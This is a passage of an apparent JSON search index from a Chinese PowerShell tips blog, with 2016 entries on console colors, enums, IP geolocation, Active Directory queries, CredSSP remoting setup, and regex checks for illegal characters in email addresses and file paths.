第一行将前景色改为微带青色的颜色，下一行将颜色改为白色。 颜色可以用三个十六进制值构成，分别由红色、绿色和蓝色分量组成。","link":"/2016/09/12/color-week-setting-powershell-ise-console-colors/"},{"title":"PowerShell 技能连载 - 色彩之周: 为 PowerShell ISE 指定命名的颜色","text":"本周我们将关注如何改变 PowerShell 控制台和 PowerShell ISE 的颜色，以便设置您的 PowerShell 环境。 在前一个技能中我们将 PowerShell ISE 控制台的前景色改为任意的自定义 RGB 颜色。您也可以从预定义的颜色种选一个： 123PS&gt; $psise.Options.ConsolePaneForegroundColor = [System.Windows.Media.Colors]::AzurePS&gt; $psise.Options.ConsolePaneForegroundColor = [System.Windows.Media.Colors]::White 在 PowerShell 控制台面板中键入这些代码时，当按下两个冒号后，智能提示将打开一个清单，列出所有预定义的颜色名。这对查找已有的名字十分有用。如果知道一个颜色名，您也可以这样写： 12345PS C:\\&gt; $psise.Options.ConsolePaneForegroundColor = 'Azure'PS C:\\&gt; $psise.Options.ConsolePaneForegroundColor = 'DarkGray'PS C:\\&gt; $psise.Options.ConsolePaneForegroundColor = 'White'","link":"/2016/09/13/color-week-using-clear-names-for-powershell-ise-colors/"},{"title":"PowerShell 技能连载 - 色彩之周: 设置 PowerShell ISE 的背景色","text":"本周我们将关注如何改变 PowerShell 控制台和 PowerShell ISE 的颜色，以便设置您的 PowerShell 环境。 在前一个技能中我们介绍了如何设置 PowerShell ISE 控制台的前景色，以及通过 red、green 和 blue 值指定颜色。 PowerShell ISE 的控制台的背景色也可以用这种方法，不过会产生一些副作用，需要规避。 首先我们将 PowerShell ISE 控制台面板的颜色改为绿底浅灰字： 1234567891011PS C:\\&gt; $psise.Options.ConsolePaneForegroundColor =[System.Windows.Media.Colors]::LightGrayPS C:\\&gt; $psise.Options.ConsolePaneBackgroundColor =[System.Windows.Media.Colors]::DarkGreenPS C:\\&gt;PS C:\\&gt;&quot;Hello&quot;HelloPS C:\\&gt; 颜色改变了，但是提示符以及所有其它的输出还是原来的颜色。这是因为在 PowerShell ISE 中还有第三个设置，它决定了文字的背景色： 12345PS C:\\&gt;$psise.Options.ConsolePaneTextBackgroundColor =[System.Windows.Media.Colors]::DarkGreenPS C:\\&gt; &quot;Hello&quot;Hello 现在看起来一切完美了。","link":"/2016/09/14/color-week-setting-powershell-ise-background-color/"},{"title":"PowerShell 技能连载 - 色彩之周: 在 PowerShell ISE 控制台中使用透明度","text":"本周我们将关注如何改变 PowerShell 控制台和 PowerShell ISE 的颜色，以便设置您的 PowerShell 环境。 在钱一个技能中您学到了三个设置控制 PowerShell ISE 控制台面板中的颜色。如果您希望的话，还可以为输入和输出设置不同的背景色： 123$psise.Options.ConsolePaneForegroundColor=[System.Windows.Media.Colors]::LightSkyBlue$psise.Options.ConsolePaneBackgroundColor=[System.Windows.Media.Colors]::DarkGreen$psise.Options.ConsolePaneTextBackgroundColor=[System.Windows.Media.Colors]::Yellow 结果类似这样： 123456789101112131415PS C:\\&gt;&quot;Hello&quot;HelloPS C:\\&gt;$HostName : Windows PowerShell ISE HostVersion : 4.0InstanceId : 840b9f0e-0c05-4b6d-84fc-c104971ac647UI : System.Management.Automation.Internal.Host.InternalHostUserInterfaceCurrentCulture : de-DECurrentUICulture: de-DEPrivateData : Microsoft.PowerShell.Host.ISE.ISEOptionsIsRunspacePushed: FalseRunspace : System.Management.Automation.Runspaces.LocalRunspace 如果您只希望将输出高亮一点点，那么可以使用透明色。文字的背景色可以变成透明，首先要确定希望使用的颜色的代码，然后用 alpha 通道创建自定义的颜色。它操作起来很简单。 在前一个例子中，文字的背景色被设置成 “Yellow”。以下是查找 “Yellow” 实际颜色值的方法： 12PS C:\\&gt; [System.Windows.Media.Colors]::Yellow.ToString()#FFFFFF00 第一个十六进制值代表 alpha 通道（不透明度）。要使黄色变得更透明，请调低这个值： 1PS&gt;$psise.Options.ConsolePaneTextBackgroundColor=&quot;#33FFFF00&quot;","link":"/2016/09/15/color-week-using-transparency-in-the-powershell-ise-console/"},{"title":"PowerShell 技能连载 - 色彩之周: 改变错误信息颜色","text":"本周我们将关注如何改变 PowerShell 控制台和 PowerShell ISE 的颜色，以便设置您的 PowerShell 环境。 PowerShell 使用预定义的颜色来显示错误信息、警告信息、详细信息，以及其他输出信息。这些颜色也可以更改。 这段代码将把错误信息改为白底红字。这个颜色更好阅读，特别在演示的时候： 12$host.PrivateData.ErrorBackgroundColor=&quot;White&quot;$host.PrivateData.ErrorForegroundColor='Red'","link":"/2016/09/16/color-week-changing-error-message-colors/"},{"title":"PowerShell 技能连载 - 色彩之周: 改变 PowerShell ISE 中的错误信息颜色","text":"本周我们将关注如何改变 PowerShell 控制台和 PowerShell ISE 的颜色，以便设置您的 PowerShell 环境。 在前一个技能中我们介绍了如何改变 PowerShell 预设的颜色，例如错误信息颜色。 在 PowerShell ISE 中，您可将这些颜色设置为指定的 16 种控制台颜色之一： 12$host.PrivateData.ErrorBackgroundColor=&quot;White&quot;$host.PrivateData.ErrorForegroundColor= 而且，PowerShell ISE 也接受自定义的 WPF 颜色。以下代码将设置错误信息为透明底橙色： 12$host.PrivateData.ErrorBackgroundColor=&quot;#00000000&quot;$host.PrivateData.ErrorForegroundColor=[System.Windows.Media.Colors]::OrangeRed","link":"/2016/09/19/color-week-changing-error-message-colors-in-the-powershell-ise/"},{"title":"PowerShell 技能连载 - 色彩之周: 为 PowerShell 控制台中的符号着色","text":"支持 PowerShell 3 以上版本 本周我们将关注如何改变 PowerShell 控制台和 PowerShell ISE 的颜色，以便设置您的 PowerShell 环境。 当您在 PowerShell ISE 输入命令的时候符号会被着色，而 PowerShell 控制台并不会。如果您喜欢着色的符号，可以试试 PSReadline 这个很棒的模块。以下是下载和安装的方法： 1PS C:\\&gt; Install-Module -Name PSReadLine -Scope CurrentUser -Force 如果不支持 “Install-Module“ 命令，那么请到 www.powershellgallery.com 下载 “PowerShellGet” MSI 安装包。它为非 PowerShell 5 的环境添加了一系列操作 Microsoft PowerShell Gallery 的功能。 安装好该模块以后，您需要加载它（在 PowerShell 控制台中，而不是在 PowerShell ISE 中）： 1PS C:\\&gt; Import-Module -Name PSReadLine 当它加载完成后，PowerShell 控制台就可以显示彩色的符号。","link":"/2016/09/20/color-week-using-token-colors-in-the-powershell-console/"},{"title":"PowerShell 技能连载 - 用秒表测定脚本执行时间","text":"是否希望了解某个命令或一段脚本运行了多少时间？以下简易的秒表对象能帮您实现这个功能： 1234567891011121314151617181920# create a new stopwatch$stopwatch = [System.Diagnostics.Stopwatch]::StartNew()# run a command$info = Get-Hotfix# stop the stopwatch, and report the milliseconds$stopwatch.Stop()$stopwatch.Elapsed.Milliseconds# continue the stopwatch$stopwatch.Start()# $stopwatch.Restart() # &lt;- resets stopwatch# run another command$files = Get-ChildItem -Path $env:windir# again, stop the stopwatch and report accumulated runtime in milliseconds$stopwatch.Stop()$stopwatch.Elapsed.Milliseconds 这个秒表比自己用 Get-Date 写的好用得多，并且能计算时间差。这个秒表可以停止、继续、复位，并且能随时自动汇报经历的时间。例如，您可以在检查代码时停止秒表，然后在准备执行下一条命令的时候重启秒表。 在上面的例子中，若您将第二处 Start() 改为 Restart() 则秒表将会复位并且报告的时间是第二条命令执行的时间而不是总时间。","link":"/2016/09/21/using-a-stopwatch-to-profile-scripts/"},{"title":"PowerShell 技能连载 - 显示对话框","text":"PowerShell 可以操作所有公公的 .NET 类，所以创建一个对话框真的很简单： 123$result = [System.Windows.MessageBox]::Show('Do you want to restart?','Restart','YesNo','Warning')$result 然而，您可能需要知道参数所支持的值。PowerShell 可以方便地将 .NET 调用封装成 PowerShell 函数，并提供所有参数的智能感知功能： 123456789101112131415161718192021#requires -Version 3.0Add-Type -AssemblyName PresentationFrameworkfunction Show-MessageBox{ param ( [Parameter(Mandatory)] [String] $Prompt, [String]$Title = 'PowerShell', [Windows.MessageBoxButton]$Button = 'OK', [Windows.MessageBoxImage]$Icon = 'Information' ) [Windows.MessageBox]::Show($Prompt, $Title, $Button, $Icon)} 当您运行这段代码后，就得到了一个超级简单的 “Show-MessageBox“ 函数。它可以接受多个参数并且通过自动完成和智能感知为您提供正确的数据。","link":"/2016/09/23/displaying-message-boxes/"},{"title":"PowerShell 技能连载 - 使用 UTC 时间","text":"在跨语言环境中，您可能希望有一种方法能将日期和时间“通用化”，例如在写日志的时候。和使用当地时间比起来，用 PowerShell 能够很方便地将 DateTime 对象转化为协调世界时 (UTC)： 1(Get-Date).ToUniversalTime()","link":"/2016/09/23/working-with-utc-times/"},{"title":"PowerShell 技能连载 - Enum 之周: 枚举的自动转换","text":"这周我们将关注枚举类型：它们是什么，以及如何利用它们。 当一个 Cmdlet 或者方法需要一个枚举值时，PowerShell 能毫无障碍地接受不完整的枚举名称。这个方法不为人知。例如这段代码将控制台的前景色改为灰色： 1PS&gt; $host.UI.RawUI.ForegroundColor = 'Gray' 这段代码将前景色改为白色： 1PS&gt; $host.UI.RawUI.ForegroundColor = 'White' ForegroundColor 属性看上去是字符串类型的，但这并不是真相。它只能接受某些字符串。这个属性的类型实际上不是字符串型。它实际上是一个只接受某些字符串值的枚举型： 12345678PS&gt; $host.UI.RawUI | Get-Member -Name ForegroundColor​ TypeName: System.Management.Automation.Internal.Host.InternalHostRawUserInterfaceName MemberType Definition---- ---------- ----------ForegroundColor Property System.ConsoleColor ForegroundColor {get;set;} 该属性实际上是 “System.ConsoleColor“ 类型。当您传入一个类似 “Gray“ 或 “White“ 的字符串时，PowerShell 实际上在后台查询 System.ConsoleColor 类型可选的值，并将传入的字符串做转换。 一个不为人知的事实是：不需要严格的匹配。您可以用这种方法写： 1234567891011 PS&gt; $host.UI.RawUI.ForegroundColor = 'R' PS&gt; $host.UI.RawUI.ForegroundColor = 'W'```powershell这段代码将把控制台的前景色改为红色，然后改回白色。PowerShell 只关心指定的值是否有歧义。如果传入了字符串 &quot;`G`&quot;，会发生异常，提示信息是名字冲突。对于灰色，至少要指定 &quot;`Gra`&quot;，因为任何比这个短的字符串都和 &quot;`Green`&quot; 相冲突。为什么这很重要？您必须尽量使用完整的枚举值以提高可读性。只需要记着会自动转换。它帮助您理解为什么这类语句可以工作：```powershell Get-Service | Where-Object { $_.Status -eq 'R' }","link":"/2016/09/26/enum-week-auto-conversion-for-enums/"},{"title":"PowerShell 技能连载 - Enum 之周: 列出枚举值","text":"这周我们将关注枚举类型：它们是什么，以及如何利用它们。 在前一个技能中我们解释了 PowerShell 如何将字符串转换为枚举值。如果您想知道某个枚举参数可以用接受哪些字符串，请先看一个简单的改变控制台颜色的例子： 12345PS&gt; $host.UI.RawUI.ForegroundColor = 'Red'PS&gt; $host.UI.RawUI.ForegroundColor = 'White'PS&gt; 这些命令先将前景色改为红色，然后改回白色。 但是您怎么知道控制台支持的颜色名称呢？首先您需要知道 ForegroundColor 的真实数据类型： 12PS&gt; $host.UI.RawUI.ForegroundColor.GetType().FullNameSystem.ConsoleColor 它的类型是 “System.ConsoleColor“。现在您可以检查它是否确实是一个枚举型： 12PS&gt; $host.UI.RawUI.ForegroundColor.GetType().IsEnumTrue 如果它确实是，例如这个例子，您可以列出它所有的值的名称： 1234567891011121314151617PS&gt; [System.Enum]::GetNames([System.ConsoleColor])BlackDarkBlueDarkGreenDarkCyanDarkRedDarkMagentaDarkYellowGrayDarkGrayBlueGreenCyanRedMagentaYellowWhite 这些值中的每一个值都可以用来设置控制台的前景色。这种方法可以应用在所有接受枚举值的属性或参数上。 同样地，如果您传入了一个和所有枚举值名称都不相同的值，异常信息中也会列出枚举值的名字。","link":"/2016/09/27/enum-week-listing-enumeration-values/"},{"title":"PowerShell 技能连载 - Enum 之周: 理解枚举值","text":"这周我们将关注枚举类型：它们是什么，以及如何利用它们。 在前一个技能中，我们探讨了枚举是如何工作的。您可能还记得我们如何改变控制台的前景色： 12345PS&gt; $host.UI.RawUI.ForegroundColor = 'Red'PS&gt; $host.UI.RawUI.ForegroundColor = 'White'PS&gt; 这些代码先将前景色改为红色，然后改回白色。用字符串表达的颜色名称隐式地转换为对应的 System.ConsoleColor enumeration 值。 多数枚举只是数字值的一种简易的标签。”Red“ 和 “White“ 实际上是 integer 数值： 12345PS&gt; [int][System.ConsoleColor]'Red'12PS&gt; [int][System.ConsoleColor]'White'15 所以如果您知道数字值，您也可以使用它们： 123PS&gt; $host.UI.RawUI.ForegroundColor = 12PS&gt; $host.UI.RawUI.ForegroundColor = 15 当然，很明显地，代码变得很难读懂。不过，还是有一种使用场合。如果您想随机设置您的控制台颜色，您可以使用数值型的值。一共有 16 种控制台颜色，所以这段代码能够用一个随机的背景色和前景色重新为您的控制台着色： 123$background, $foreground = 0..15 | Get-Random -Count 2$host.UI.RawUI.BackgroundColor = $background$host.UI.RawUI.ForegroundColor = $foreground","link":"/2016/09/28/enum-week-understanding-enumeration-values/"},{"title":"PowerShell 技能连载 - Enum 之周: 快速关闭 Cmdlet 错误提示","text":"这周我们将关注枚举类型：它们是什么，以及如何利用它们。 在前一个技能中，我们学习了枚举类型。这个技能教您如何使用最少的代码关闭 Cmdlet 产生的错误信息。 非管理员账户执行这行代码将产生错误信息，因为您无法存取其他用户的进程信息： 1PS&gt; Get-Process -FileVersionInfo 由于这个错误是良性的，并且不可避免，您可能会想将它们屏蔽： 1PS&gt; Get-Process -FileVersionInfo -ErrorAction SilentlyContinue 这对于脚本来说是完美的语法。当您交互式地运行代码时，您完全可以用难看的窍门来缩短关键字的输入，只需要写： 1PS&gt; Get-Process -FileVersionInfo -ea 0 “-ea“ 是 -ErrorAction 参数的别名，而数字 0 相当于 SilentlyContinue 的枚举值。 要查看一个参数的别名，可以使用这样的代码： 12PS&gt; (Get-Command -Name Get-Process).Parameters[&quot;ErrorAction&quot;].Aliasesea 要查看枚举值对应的数字值，首先确定参数的数据类型： 12PS&gt; (Get-Command -Name Get-Process).Parameters[&quot;ErrorAction&quot;].ParameterType.FullNameSystem.Management.Automation.ActionPreference 下一步，将参数转成一个整形： 12PS&gt; [int][System.Management.Automation.ActionPreference]::SilentlyContinue0 So if you’d like to create a shortcut for the parameter value “Ignore” instead of “SilentlyContinue”, try this: 所以如果您想了解参数值 “Ignore“ 而不是 “SilentlyContinue“，请试验以下代码： 12PS&gt; [int][System.Management.Automation.ActionPreference]::Ignore4 “SilientlyContinue“ 和 “Ignore“ 都禁止了错误的输出，但是 “SilentlyContinue“ 还会将禁止输出的错误信息写入 PowerShell 的 $error 变量中。 从现在开始，您在交互式操作 PowerShell 时可以用这种方式使用 “Ignore“ 禁用错误信息： 1PS&gt; Get-Process -FileVersionInfo -ea 4 请注意：您也可以在脚本中使用这些快捷方式，但最好不要这么做。脚本中应当按照 PowerShell 的缺省写法，才能清晰易读。","link":"/2016/09/29/enum-week-suppressing-cmdlet-errors-fast/"},{"title":"PowerShell 技能连载 - Enum 之周: PowerShell 5 中的枚举","text":"支持 PowerShell 5 以上版本 这周我们将关注枚举类型：它们是什么，以及如何利用它们。 从 PowerShell 5 开始，您可以用 “Enum“创建您自己的枚举类型。通过这种方式，用户可以用可阅读的名字，而不是幻数。 1234567891011121314151617181920212223#requires -Version 5.0Enum ComputerType{ ManagedServer ManagedClient Server Client}function Connect-Computer{ param ( [ComputerType] $Type, [string] $Name ) &quot;Computername: $Name Type: $Type&quot;} 当您运行完这段代码，并调用 “Connect-Computer“ 函数之后，PowerShell 自动为您的枚举值提供智能提示，并且只接受枚举类型里规定的值。 1234PS C:\\&gt; Connect-Computer -Type Client -Name TestComputername: Test Type: ClientPS C:\\&gt;","link":"/2016/09/30/enum-week-enums-in-powershell-5/"},{"title":"PowerShell 技能连载 - 查找由 DHCP 分配的 IP 地址","text":"从 Windows 8 和 Server 2012 起，随着操作系统一起分发了一些扩展的 PowerShell 模块，用于管理服务器和客户端，例如 Get-NetIPAddress 等 cmdlet。 如果您想获得一个所有由 DHCP 分配的 IP 地址列表，可以试试以下方法： 12345#requires -Version 3.0 -Modules NetTCPIPGet-NetIPAddress | Where-Object PrefixOrigin -eq dhcp | Select-Object -ExpandProperty IPAddress","link":"/2016/10/03/finding-ip-address-assigned-by-dhcp/"},{"title":"PowerShell 技能连载 - 查找 IP 地址的地理位置","text":"大多数 IP 地址可以用 Web Service 定位到物理地址。以下是一个很简单的函数，能够输入一个 IP 地址并返回它的物理地址： 1234567#requires -Version 3.0function Get-IPLocation([Parameter(Mandatory)]$IPAddress){ Invoke-RestMethod -Method Get -Uri &quot;http://geoip.nekudo.com/api/$IPAddress&quot; | Select-Object -ExpandProperty Country -Property City, IP, Location} 这个例子能够演示如何用 Select-Object 配合 -Property 和 -ExpandProperty 参数将一些嵌套的属性移到上一层。 让我们查找 Google DNS 服务器位于什么位置： 1234567PS C:\\&gt; Get-IPLocation -IPAddress 8.8.8.8name : United Statescode : UScity : Mountain Viewip : 8.8.8.8location : @{accuracy_radius=1000; latitude=37,386; longitude=-122,0838; time_zone=America/Los_Angeles} And here is how you can resolve any hostname to an IP address, for example, the famous powershellmagazine.com:以下是如何将任意主机名解析成 IP 地址的代码，例如知名的 powershellmagazine.com： 12PS&gt; [Net.Dns]::GetHostByName('powershellmagazine.com').AddressList.IPAddressToString104.131.21.239 所以如果您想知道该 IP 地址位于哪里，请加上这段代码： 12345678PS&gt; Get-IPLocation -IPAddress 104.131.21.239name : United Statescode : UScity : New Yorkip : 104.131.21.239location : @{accuracy_radius=1000; latitude=40,7143; longitude=-74,006; time_zone=America/New_York} (of course this is just where the server sits, not Aleksandar or Ravi or all the other fine editors（当然这只代表了服务器的所在地，而不是 Aleksandar or Ravi 及其它知名编辑的位置 ）","link":"/2016/10/04/finding-location-of-ip-address/"},{"title":"PowerShell 技能连载 - 查找公开 IP 地址","text":"您是否希望了解您当前连接到 Internet 的公开 IP 地址？以下是一行代码： 12#requires -Version 3.0Invoke-RestMethod -Uri http://checkip.amazonaws.com/ 通过这个 IP 地址，您还可以向 Internet 请求您的地理地址： 1234#requires -Version 3.0$ip = Invoke-RestMethod -Uri http://checkip.amazonaws.com/Invoke-RestMethod -Uri &quot;http://geoip.nekudo.com/api/$IP&quot; | Select-Object -ExpandProperty Country","link":"/2016/10/05/finding-public-ip-address1/"},{"title":"PowerShell 技能连载 - 在地图上定位您的地理位置","text":"在前一个技能当中，通过 Internet 能知道您的 IP 地址，以及地理位置。您可以获得当前公开 IP 地址的经纬度，代码如下： 123456$ip = Invoke-RestMethod -Uri http://checkip.amazonaws.com/$geo = Invoke-RestMethod -Uri &quot;http://geoip.nekudo.com/api/$IP&quot;$latitude = $geo.Location.Latitude$longitude = $geo.Location.Longitude&quot;Lat $latitude Long $longitude&quot; 如果您希望看到它究竟在什么位置，可以将这些信息连到 Google Maps 上： 1234567$ip = Invoke-RestMethod -Uri http://checkip.amazonaws.com/$geo = Invoke-RestMethod -Uri &quot;http://geoip.nekudo.com/api/$IP&quot;$latitude = $geo.Location.Latitude$longitude = $geo.Location.Longitude$url = &quot;https://www.google.com/maps/preview/@$latitude,$longitude,8z&quot;Start-Process -FilePath $url 这段代码将打开浏览器，导航到 Google Maps，并且在地图上显示当前位置。当前通过 IP 地址定位地理位置还比较粗糙，至少在使用公开地理数据时。","link":"/2016/10/06/geolocating-your-ip-on-a-map/"},{"title":"PowerShell 技能连载 - 查找一个月中的第一天和最后一天","text":"您是否曾需要了解某个月的第一天和最后一天？ 以下是一个简单的实现方法： 12345678910111213# specify the date you want to examine# default is today$date = Get-Date$year = $date.Year$month = $date.Month# create a new DateTime object set to the first day of a given month and year$startOfMonth = Get-Date -Year $year -Month $month -Day 1 -Hour 0 -Minute 0 -Second 0 -Millisecond 0# add a month and subtract the smallest possible time unit$endOfMonth = ($startOfMonth).AddMonths(1).AddTicks(-1)$startOfMonth$endOfMonth","link":"/2016/10/07/finding-first-and-last-day-in-month/"},{"title":"PowerShell 技能连载 - 在 Active Directory 中查找操作系统版本","text":"如果您安装了带有 “ActiveDirectory” PowerShell 模块的 Microsoft RSAT 工具，以下是一个快速获取您环境中操作系统清单的快速方法： 1234#requires -Module ActiveDirectoryGet-ADComputer -Filter * -Properties OperatingSystem, OperatingSystemServicePack, OperatingSystemVersion | Select-Object -Property Name, OperatingSystem, OperatingSystemServicePack, OperatingSystemVersion 这将获得所有计算机的信息。您可以将搜索范围限制在指定的计算机名和 AD 位置中。以下命令将搜索范围限制在 $root AD 范围内，以及只包含名字以 “Serv” 开头的计算机中： 123456#requires -Module ActiveDirectory$root = 'OU=North,OU=Clients,DC=yourcompany,DC=com'Get-ADComputer -Filter { Name -like 'Serv*' } -Properties OperatingSystem, OperatingSystemServicePack, OperatingSystemVersion &lt;#-ResultSetSize 10#&gt; -SearchBase $root -SearchScope Subtree | Select-Object -Property Name, OperatingSystem, OperatingSystemServicePack, OperatingSystemVersion","link":"/2016/10/10/finding-operating-system-versions-in-active-directory/"},{"title":"PowerShell 技能连载 - 查找操作系统架构信息","text":"这是获取您操作系统信息的一行代码： 1Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *OS* 结果看起来类似如下： 12345ForegroundApplicationBoost : 2OSArchitecture : 64-bitOSLanguage : 1031OSProductSuite : 256OSType : 18 如果您想知道这些数字代表什么意思，可以在网上搜索 Win32_OperatingSystem 第一个链接就会引导您到对应的 MSDN 文档。 如果您想从一个远程系统中获取信息，请使用 -ComputerName 和 –Credential 参数。","link":"/2016/10/11/finding-operating-system-architecture-information/"},{"title":"PowerShell 技能连载 - 获取计算机的地理位置","text":"这是获取地理位置信息的另一个免费源，它能够获取您当前的公网 IP 和位置信息： 123#requires -Version 3.0Invoke-RestMethod -Uri 'http://ipinfo.io' 结果大概如下： 123456ip : 80.187.113.144hostname : tmo-113-144.customers.d1-online.comregion :country : DEloc : 51.2993,9.4910org : AS3320 Deutsche Telekom AG","link":"/2016/10/12/get-geolocation-of-computer/"},{"title":"PowerShell 技能连载 - 将 SID 翻译为用户名","text":"是否希望将安全标识符（SID）翻译为一个真实的名称？这个函数将能够帮助您： 123456789101112131415161718#requires -Version 3.0function ConvertFrom-SID{ param ( [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)] [Alias('Value')] $Sid ) process { $objSID = New-Object System.Security.Principal.SecurityIdentifier($sid) $objUser = $objSID.Translate( [System.Security.Principal.NTAccount]) $objUser.Value }} 您可以通过参数传入 SID，或通过管道传入一个或多个 SID 给这个函数。","link":"/2016/10/13/translating-sid-to-username/"},{"title":"PowerShell 技能连载 - Getting List of Current Group Memberships","text":"当您可以通过 Active Directory 来获取一个用户的组成员，有一个简单的方法是直接通过用户的 access token 获取信息，而不需要 AD 联系人。 这行代码将取出当前用户所在的所有组的 SID： 12#requires -Version 3.0 [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups.Value 这是获取翻译后的组名的方法： 12#requires -Version 3.0 [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups.Translate( [System.Security.Principal.NTAccount]) 如果这个列表中有重复，那么您就可以知道有多个 SID 指向同一个名字。这种情况在您曾经迁移过 AD（SID 历史）时可能会发生。只需要将结果用管道输出到 Sort-Object -Unique 就能移除重复。","link":"/2016/10/14/getting-list-of-current-group-memberships/"},{"title":"PowerShell 技能连载 - 查找隐藏的自启动程序","text":"Ever wondered why some programs launch whenever you log into Windows? Here’s a one liner listing autostarts that affect your login:是否好奇为什么有些程序在登录 Windows 的时候会自动启动？这是一行列出登录时自启动项的代码： 12345#requires -Version 3Get-CimInstance -ClassName Win32_StartupCommand | Select-Object -Property Command, Description, User, Location | Out-GridView","link":"/2016/10/17/finding-hidden-autostart-programs/"},{"title":"PowerShell 技能连载 - 理解二次远程连接问题","text":"当您用 Invoke-Command 远程执行 PowerShell 代码时，您的凭据将会锁定在首个连接的机器上。 PowerShell 远程连接默认情况下不会传递您的凭据，不会使用您的凭据来登录别的系统。这听起来是个好主意，不过在某些情况也严重限制了您的代码。 这是一个典型的错误代码： 123456$code ={ Get-ChildItem -Path \\\\fls01\\#TRAIN1\\PowerShell\\Class}Invoke-Command -ScriptBlock $code -ComputerName server1 这段代码试图在远程访问一个文件共享。但是即便您有权限访问该共享，这段远程代码也无法使用您的身份进行第三方验证（在这个例子中是文件服务器）。","link":"/2016/10/18/understanding-the-double-hop-problem-in-remoting/"},{"title":"PowerShell 技能连载 - 用 CredSSP 解决二次远程连接","text":"在钱一个技能中我们演示了当您的远程代码试图通过第三方身份认证时会遇到的二次远程连接问题。 在您在客户端和服务端之间创建了一个可信的连接之后，可以传递您的凭据（只需要做一次，并且需要管理员权限）。 在客户端，运行这段代码： 1Enable-WSManCredSSP -Role Client -DelegateComputer nameOfServer 在服务端，运行这段代码： 1Enable-WSManCredSSP -Role Server 现在将 PowerShell 代码从客户端发送到服务端并执行时，服务端能够将您的凭据送给第三方验证通过，所以远程代码可以通过文件服务器的身份认证并访问共享文件夹： 12345678#requires -Version 3.0$code ={ Get-ChildItem -Path \\\\fls01\\#TRAIN1\\PowerShell\\Class}Invoke-Command -Authentication Credssp -ScriptBlock $code -ComputerName nameOfServer -Credential myCompany\\myName 请注意当您使用 CredSSP 验证时，您必须提交显式的凭据（用 -Credential）且无法通过 Kerberos 透明传输当前的身份。","link":"/2016/10/19/solving-double-hop-remoting-with-credssp/"},{"title":"PowerShell 技能连载 - 在单侧启用 CredSSP","text":"如之前所示，CredSSP 可以用在远程代码上，避免二次连接问题。不过，要使用 CredSSP 验证方式您得在客户端和服务端分别设置，才能使它们彼此信任。 这并不意味着您必须物理接触那台服务器。如果您想在您的计算机和任何一台服务器（假设那台服务器上启用了 PowerShell 远程连接）建立一个 CredSSP 信任关系，只需要做这些： 12345678#requires -Version 2.0 -RunAsAdministrator# this is the server you want to communicate with using CredSSP# the server needs to have PowerShell remoting enabled already$Server = 'NameOfServer'Enable-WSManCredSSP -Role Client -DelegateComputer $Server -ForceInvoke-Command { Enable-WSManCredSSP -Role Server } -ComputerName $Server 如您所见，Enable-WSManCredSSP 可以远程执行。","link":"/2016/10/20/enabling-credssp-trust-from-one-side/"},{"title":"PowerShell 技能连载 - PowerShell Remoting and HTTP 403 Error","text":"如果您在使用 PowerShell 远程操作时遇到“HTTP 403”错误，一个潜在的原因可能是代理服务器影响了请求。 不过，要禁用代理服务器很容易。只需要在您的呼叫中增加一个 session 选项并且将 ProxyAccessType 设置为“NoProxyServer”即可： 12345678# you are connecting to this computer# the computer in $destinationcomputer needs to have# PowerShell remoting enabled$DestinationComputer = 'server12'$option = New-PSSessionOption -ProxyAccessType NoProxyServerInvoke-Command -ScriptBlock { &quot;Connected to $env:computername&quot; } -ComputerName $DestinationComputer -SessionOption $option","link":"/2016/10/21/powershell-remoting-and-http-403-error/"},{"title":"PowerShell 技能连载 - 检查电子邮件地址（或其它文本）中的非法字符","text":"这是一个清晰的检测和验证数据的快捷方法。假设您需要验证一个电子邮件地址是否包含非法字符： 12345678910111213# some email address$mail = 'thomas.börsenberg@test.com'# list of allowed characters$pattern = '[^a-z0-9\\.@]'if ($mail -match $pattern){ ('Invalid character in email address: {0}' -f $matches[0])}else{ 'Email address is good.'} 这段代码使用了正则表达式。正则表达式列出所有合法的字符（从 a 到 z，以及某些特殊字符）。在前面加上“^”，列表的含义发生反转，代表所有非法字符。如果找到至少一个字符，则返回第一个非法字符。 Invalid character in email address: ö","link":"/2016/10/24/checking-email-addresses-and-other-text-for-illegal-chars-directory/"},{"title":"PowerShell 技能连载 - 查找多个非法字符","text":"之前发，我们演示了如何用 -match 操作符来查找一段文本中的非法字符。不过，-match 操作符只能查找第一个匹配项。要列出字符串中的所有非法字符，请使用这种方法： 1234567891011# some email address$mail = 'THOMAS.börßen_senbÖrg@test.com'# list of legal characters, inverted by &quot;^&quot;$pattern = '[^a-z0-9\\.@]'# find all matches, case-insensitive$allMatch = [regex]::Matches($mail, $pattern, 'IgnoreCase')# create list of invalid characters$invalid = $allMatch.Value | Sort-Object -Unique'Illegal characters found: {0}' -f ($invalid -join ', ') 结果看起来如下： Illegal characters found: _, ö, ß","link":"/2016/10/25/finding-multiple-illegal-characters-directory/"},{"title":"PowerShell 技能连载 - 查找文件路径中的非法字符（基于文件系统）","text":"之前我们演示了如何使用简易的基于正则表达式的方法来查找字符串中的非法字符。我们鼓励您将这种策略运用到各种需要验证的字符串中。 如果您希望检测文件系统中的非法字符，以下是一个简单的适配： 12345678910111213141516171819# check path:$pathToCheck = 'c:\\test\\&lt;somefolder&gt;\\f|le.txt'# get invalid characters and escape them for use with RegEx$illegal =[Regex]::Escape(-join [System.Io.Path]::GetInvalidPathChars())$pattern = &quot;[$illegal]&quot;# find illegal characters$invalid = [regex]::Matches($pathToCheck, $pattern, 'IgnoreCase').Value | Sort-Object -Unique$hasInvalid = $invalid -ne $nullif ($hasInvalid){ &quot;Do not use these characters in paths: $invalid&quot;}else{ 'OK!'} 非法的字符是从 GetInvalidPathChars() 中提取的并且用正则表达式转换为转义字符串。这个列表放在方括号中，所以当其中任一字符匹配成功时，RegEx 将能够报告匹配结果。 以下是结果： Do not use these characters in paths: | &lt; &gt;","link":"/2016/10/26/finding-illegal-characters-in-paths-file-system-directory/"},{"title":"PowerShell 技能连载 - 检查文件名的非法字符","text":"文件的命名是十分敏感的，不能包含某些特定的保留字符。要验证文件名并确保这些字符是合法的，以下对昨天的脚本（检查文件系统路径）做了一点改进。这个脚本检查文件名的合法性： 12345678910111213141516171819# check path:$filenameToCheck = 'testfile:?.txt'# get invalid characters and escape them for use with RegEx$illegal =[Regex]::Escape(-join [System.Io.Path]::GetInvalidFileNameChars())$pattern = &quot;[$illegal]&quot;# find illegal characters$invalid = [regex]::Matches($filenameToCheck, $pattern, 'IgnoreCase').Value | Sort-Object -Unique$hasInvalid = $invalid -ne $nullif ($hasInvalid){ &quot;Do not use these characters in file names: $invalid&quot;}else{ 'OK!'} 结果如下： Do not use 